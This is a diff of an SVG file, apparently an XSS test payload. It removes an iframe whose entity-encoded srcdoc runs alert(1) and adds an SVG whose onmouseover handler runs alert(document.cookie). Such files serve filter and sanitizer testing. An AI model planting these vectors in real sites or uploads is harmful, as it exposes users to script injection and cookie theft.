@@ -1,12 +1,7 @@
-<!DOCTYPE html>
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
 
- <svg width="600" height="800" xmlns="http://www.w3.org/2000/svg">
-
-
-     <g>
-   <foreignObject height="600" width="600" y="10">
-    <iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;" height="600" width="600"/>
-   </foreignObject>
- </g>
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" onmouseover="alert(document.cookie)">
+   <polygon id="circle" points="0,0 0,50 50,0" fill="#009901" stroke="#004400"/>
 </svg>
